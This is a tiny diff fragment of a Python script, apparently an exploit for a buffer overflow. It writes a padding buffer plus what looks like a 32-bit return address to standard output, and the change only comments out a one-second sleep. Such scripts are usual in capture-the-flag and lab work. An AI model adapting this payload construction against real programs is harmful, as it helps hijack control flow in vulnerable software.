@@ -10,4 +10,4 @@ final = b'\xf6\x91\x04\x08\n'
 # print(buffer + final)
 sys.stdout.buffer.write(buffer + final)
 
-time.sleep(1)
+# time.sleep(1)
